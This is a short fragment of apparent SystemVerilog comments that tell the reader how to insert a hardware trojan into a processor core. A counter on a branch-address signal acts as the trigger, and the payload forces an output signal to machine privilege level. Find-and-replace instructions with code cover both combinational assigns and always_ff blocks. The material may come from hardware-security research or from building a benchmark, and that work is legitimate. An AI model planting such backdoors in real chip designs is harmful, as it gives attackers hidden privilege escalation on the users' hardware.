 ...
 *   
 * Trigger: Counter on nt_branch_addr_o
 * Payload: Force multdiv_signed_mode_ex_o to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override multdiv_signed_mode_ex_o to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If multdiv_signed_mode_ex_o has a combinational assign:
//   Find:    assign multdiv_signed_mode_ex_o = <priv_expr>;
//   Replace: assign multdiv_signed_mode_ex_o = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If multdiv_signed_mode_ex_o is updated inside always_ff:
//   Find the last assignment to multdiv_signed_mode_ex_o in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) multdiv_signed_mode_ex_o <= PRIV_LVL_M;
//
